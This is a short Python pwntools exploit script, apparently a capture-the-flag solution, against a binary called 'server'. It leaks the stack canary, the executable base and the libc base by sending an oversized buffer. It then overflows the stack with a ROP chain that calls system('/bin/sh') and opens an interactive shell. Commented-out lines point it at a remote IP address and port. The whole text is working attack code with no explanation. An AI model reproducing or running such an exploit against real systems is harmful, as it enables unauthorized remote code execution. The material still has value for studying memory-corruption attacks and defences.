from pwn import *


# sh=process(["./client","104.248.146.184", "10001"])

# sh=remote("104.248.146.184",10001)
sh=process("server")
exe = ELF("server")
libc = exe.libc
# gdb.attach(sh,"""
# 	b *run
# 	""")

# sh.sendline("0")
sh.send(p32(0x600))

p = 'a'.ljust(1000,'a')
sh.sendline(p)

sh.recvuntil("\x7f\x00\x00")
canary = u64(sh.recv(8))
print hex(canary)
exec_leak = u64(sh.recvuntil("\x55")[-6:].ljust(8,"\x00"))
print "exec leak",hex(exec_leak)
libc_leak = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
print hex(libc_leak)
libc.address = libc_leak - libc.sym["__libc_start_main"] - 234
print hex(libc.address)
# sh.sendline(p64(0xfffffff0))
exec_base = exec_leak - 0x12d4
pop_rdi = exec_base + 0x0000000000001343
pop_rsi = exec_base + 0x0000000000001341
print "Base exec : ",hex(exec_base)
sh.send(p32(0x600))

p = 'a'* 8 * 129
p+= p64(canary)
p+= p64(0)
p+= p64(pop_rdi)
p+= p64(libc.search("/bin/sh").next())
p+= p64(pop_rsi)
p+= p64(0)*2
p+= p64(libc.sym["system"])
sh.sendline(p)

sh.send(p32(0x80000000))
# sh.send(p32(0x80000000))

sh.interactive()